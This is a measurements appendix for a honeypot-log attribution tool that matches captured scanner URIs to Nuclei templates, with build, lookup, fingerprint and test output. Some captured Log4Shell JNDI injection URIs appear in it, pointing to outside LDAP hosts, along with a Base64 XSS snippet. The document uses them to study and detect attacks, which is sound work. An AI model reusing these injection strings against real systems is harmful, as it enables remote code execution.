# Measurements behind ANALYSIS.md

All commands were run on 2026-09-04 from a Linux container. Layout:
nucleotide checkout at `/home/claude/nucleotide`; the 1.0.0 commit as a
worktree at `/home/claude/nucleotide-v1` (`git worktree add … d6dee5b`);
the anchoring-only candidate as a worktree at `/home/claude/nucleotide-v2a`
(not released — it differed from 2.0.0 only by lacking §2.2 of ANALYSIS.md);
Nuclei template corpus at `/home/claude/nuclei-templates` (13,611
templates); capture sets under `/home/claude/data/`. Single runs; no
averaging.

Capture sets are not committed to this repository. The Log4Shell set is
derived from Honeynet T-Pot logs (2021-12-14 to 2021-12-16); the galah set
from the 0x4D31/galah honeypot project.

## Dataset sizes

```
$ wc -l log4shell-events.jsonl galah-events.jsonl l4s-uris.txt galah-uris.txt
   686 log4shell-events.jsonl
    63 galah-events.jsonl
    65 l4s-uris.txt
    62 galah-uris.txt
$ python3 -c "import json;print(len({json.loads(l)['src_ip'] for l in open('log4shell-events.jsonl')}))"
75
```

## Build

```
$ cd nucleotide-v1  && time python -m nucleotide.cli build --templates-dir /home/claude/nuclei-templates --out /home/claude/lookup-v1.json
Wrote … | templates=13611 snippets=6952 unresolved=2231 yara=11506 snort[T1=12875 T2=1199 T3=548 T5=20078]
85.47 s
$ cd nucleotide-v2a && time python -m nucleotide.cli build --templates-dir /home/claude/nuclei-templates --out /home/claude/lookup-v2a.json
Wrote … quality[strong=4254 medium=2696 weak=2]
116.06 s
$ cd nucleotide     && time python -m nucleotide.cli build --templates-dir /home/claude/nuclei-templates --out /home/claude/lookup-v2.json
Wrote … quality[strong=5303 medium=1620 weak=29]
94.88 s
```

## Snippet selection

```
$ python3 - <<'EOF'
import json
v1=json.load(open('/home/claude/lookup-v1.json'))['snippet_index']
for name in ('v2a','v2'):
    d=json.load(open(f'/home/claude/lookup-{name}.json'))
    for t in ['httpbin-xss','open-proxy-internal','redis-config','filebrowser-login-panel','wordpress-akismet','landray-eis-ws-infoleak','CVE-2023-40748']:
        print(name, t, [s for s,x in v1.items() if x==t], d['templates'][t]['url_snippet'], d['templates'][t]['snippet_quality'])
    print(name, 'weak:', sorted(s for s,q in d['snippet_quality'].items() if q=='weak'))
EOF
v2a httpbin-xss ['e64/'] base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ strong
v2a open-proxy-internal ['//19'] /192 medium
v2a redis-config ['edis'] redis medium
v2a filebrowser-login-panel ['on-3'] img/icons strong
v2a wordpress-akismet ['s/ak'] akismet medium
v2a landray-eis-ws-infoleak ['WS/B'] Basic medium
v2a CVE-2023-40748 ['%3dc'] 6100 medium
v2a weak: ['Ly93', 'ovL3']
v2 httpbin-xss ['e64/'] base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ strong
v2 open-proxy-internal ['//19'] /ntp medium
v2 redis-config ['edis'] redis medium
v2 filebrowser-login-panel ['on-3'] img/icons strong
v2 wordpress-akismet ['s/ak'] akismet medium
v2 landray-eis-ws-infoleak ['WS/B'] WS/Basic strong
v2 CVE-2023-40748 ['%3dc'] 6100%3d6100 strong
v2 weak: ['/&?=', '/?dev', '/?f=', '/Prox', '/_bu', '/b/l', '/cap.', '/cloud/', '/eos', '/fina', '/graphs', '/marku', '/rom', '/s/a', '/~40', '/~lo', ':505', ':900', ':918', 'Ly93', 'db.x', 'e%252fetc/', 'er/3', 'gi?7', 'go.m', 'i/?r', 'lande', 'lask/', 'ovL3']
```

## Lookup on capture sets

Verdict counts (`cut -f2 | sort | uniq -c`) and UNIQUE/WEAK rows by
snippet (`grep -P "\t(UNIQUE|WEAK)\t" | cut -f2,3,4,7 | sort | uniq -c | sort -rn`).

Log4Shell, 1.0.0 (`data/l4s-lookup.tsv`, produced in the earlier session):

```
 58 AMBIGUOUS   16 NO_MATCH   88 UNIQUE
 41 UNIQUE open-proxy-internal //19
 41 UNIQUE httpbin-xss e64/
  2 UNIQUE apache-streampipes-detect mg/f
  1 UNIQUE wptouch-xss uch-
  1 UNIQUE CVE-2025-3515 -tou
  1 UNIQUE CVE-2023-44982 reti
  1 UNIQUE CVE-2022-0653 sc/f
```

Log4Shell, anchoring only (`lookup-v2a.json`):

```
 58 AMBIGUOUS    6 NO_MATCH   55 UNIQUE
 41 UNIQUE landray-eis-ws-infoleak Basic medium
 11 UNIQUE CVE-2023-40748 6100 medium
  2 UNIQUE apache-streampipes-detect img/favicon strong
  1 UNIQUE CVE-2024-31982 2823 medium
```

Log4Shell, 2.0.0 (`lookup-v2.json`; 0.62 s):

```
 58 AMBIGUOUS   58 NO_MATCH    1 UNIQUE    1 WEAK
  1 UNIQUE apache-streampipes-detect img/favicon strong
  1 WEAK   apache-streampipes-detect img/favicon weak      (mid-token in that URI)
$ … --min-quality strong :   58 AMBIGUOUS   59 NO_MATCH   1 UNIQUE
```

galah, 1.0.0 (`data/galah-lookup.tsv`):

```
144 AMBIGUOUS   23 NO_MATCH   37 UNIQUE
  2 mcafee-epo-rce at.j | 2 imo-file-download laca | 2 detect-dns-over-https dns- | 2 CVE-2023-1389 ci/;
  1 each: on/z edis ake- le=n lesc /hug e64/ p/ja on-3 rall /poo tatem ws/cr o/sy md&+ ns-w cmd, ts/M
          kk_s can- ovL3 r/wm /SDK on?@ ecp/ r/Au .exp /Gpo in/../
```

galah, anchoring only:

```
144 AMBIGUOUS   29 NO_MATCH   23 UNIQUE   1 WEAK
  2 dns-query strong | 2 ;stok medium | 1 each: htm=1 telescope /pools aws/credentials /password.php
  eventin %ADd pearcmd&+config-create cmd, MyCRL skk_set geoserver/wms /SDK ecp/ ?name=e /Autodiscover
  m3u8 GponForm 2Fbin | WEAK: ovL3
```

galah, 2.0.0:

```
144 AMBIGUOUS   30 NO_MATCH   18 UNIQUE   3 WEAK
  2 UNIQUE detect-dns-over-https dns-query strong
  2 UNIQUE CVE-2023-1389 ;stok medium
  1 UNIQUE netgear-dgn-rce htm=1 medium
  1 UNIQUE laravel-telescope telescope strong
  1 UNIQUE couchbase-buckets-api pools/default strong
  1 UNIQUE aws-credentials aws/credentials strong
  1 UNIQUE CVE-2025-62512 /password.php strong
  1 UNIQUE CVE-2024-3136 pearcmd&+config-create strong
  1 UNIQUE CVE-2024-29973 cmd, medium
  1 UNIQUE CVE-2024-24919 MyCRL medium
  1 UNIQUE CVE-2024-22729 skk_set medium
  1 UNIQUE CVE-2022-24816 geoserver/wms strong
  1 UNIQUE CVE-2021-36260 /SDK medium
  1 UNIQUE CVE-2019-9670 /Autodiscover strong
  1 UNIQUE CVE-2019-11013 m3u8 medium
  1 UNIQUE CVE-2018-10562 GponForm strong
  1 WEAK   CVE-2025-47539 eventin weak
  1 WEAK   CVE-2022-29349 ovL3 weak
  1 WEAK   CVE-2021-33766 ecp/ weak
```

Example URI behind the 1.0.0 and anchoring-only Log4Shell false UNIQUEs
(from `195.54.160.149`; Base64 payload elided):

```
/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1…}
1.0.0:           UNIQUE open-proxy-internal //19
1.0.0:           UNIQUE httpbin-xss e64/
anchoring only:  UNIQUE landray-eis-ws-infoleak Basic medium
2.0.0:           NO_MATCH
```

The `6100` hit came from URIs of the form
`/${jndi:ldap://167.71.13.196:2222/lx-ffff89b854e2f0230095f9b86100000000183134}`.

## Fingerprints

1.0.0 fingerprints are the `data/fp-<ip>.yml` files produced in the earlier
session with a 1.0.0 `lookup.json`. 2.0.0:

```
$ for f in data/actor-*.jsonl; do ip=$(basename $f .jsonl | sed s/actor-//);
    python -m nucleotide.cli fingerprint $f --lookup /home/claude/lookup-v2.json --out /tmp/fp3-$ip.yml; done
$ grep -m1 -E "likely_tool|confidence|low_signal|structural_hash|-rate-limit" /tmp/fp3-*.yml   # tabulated in ANALYSIS.md §3.3
$ time python -m nucleotide.cli fingerprint data/actor-195.54.160.149.jsonl --lookup /home/claude/lookup-v1.json  …  # 0.76 s (1.0.0 worktree)
$ time python -m nucleotide.cli fingerprint data/actor-195.54.160.149.jsonl --lookup /home/claude/lookup-v2a.json …  # 0.81 s
$ time python -m nucleotide.cli fingerprint data/actor-195.54.160.149.jsonl --lookup /home/claude/lookup-v2.json  …  # 0.72 s
```

2.0.0 fingerprint for `195.54.160.149`:

```
low_signal: true
tool_inference.likely_tool: "unknown"
tool_inference.confidence: 0.5
tool_inference.signals: []
inferred_cli_options.-severity: []
inferred_cli_options.-tags: null
template_preference.matched: []
template_preference.weak_only_matches: []
```

Shape discriminators for the two hash-sharing pairs:

```
$ python3 -c "
import json; from nucleotide.actor import infer_path_shapes, infer_ua_shapes
for ip in ['167.71.175.10','170.210.45.163','164.52.53.163','34.65.121.142']:
    ev=[json.loads(l) for l in open(f'data/actor-{ip}.jsonl')]; print(ip, infer_ua_shapes(ev), infer_path_shapes(ev))"
167.71.175.10  ['${jndi:ldap://N.N.N.N:N/Exploit}', 'Mozilla/N.N (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox', 'curl/N.N.N'] ['/', '/${jndi:ldap://A:N/Exploit}']
170.210.45.163 (identical)
164.52.53.163  ['${jndi:ldap://N.N.N.N:N/Exploit}', 'curl/N.N.N'] ['/', '/${jndi:ldap://A:N/Exploit}']
34.65.121.142  (identical)
```

## Tests and coverage

```
$ (cd nucleotide-v1 && python -m unittest discover -s tests 2>&1 | grep ^Ran)
Ran 104 tests in 19.341s
$ python -m unittest discover -s tests 2>&1 | grep ^Ran
Ran 137 tests in 40.837s
$ python -m coverage run -m unittest discover -s tests && python -m coverage report --include='nucleotide/*' | tail -1
TOTAL   1655   199   88%
$ python -m coverage run --branch -m unittest discover -s tests && python -m coverage report --include='nucleotide/*' | tail -1
TOTAL   1655   199   824   120   86%
```

## Common-word list

```
$ python -m nucleotide.data.regen_common_words
wrote 28338 words to nucleotide/data/common-words.txt      (wordfreq 3.1.1, wordlist='best', lang='en', Zipf >= 3.0)
$ python3 -c "from wordfreq import zipf_frequency as z; print({w: z(w,'en') for w in ['basic','login','admin','api','index','status','mgmt','saml','redis','luci','stok']})"
{'basic': 4.89, 'login': 3.49, 'admin': 3.92, 'api': 3.68, 'index': 4.57, 'status': 4.87, 'mgmt': 2.81, 'saml': 2.11, 'redis': 1.98, 'luci': 2.47, 'stok': 1.86}
```
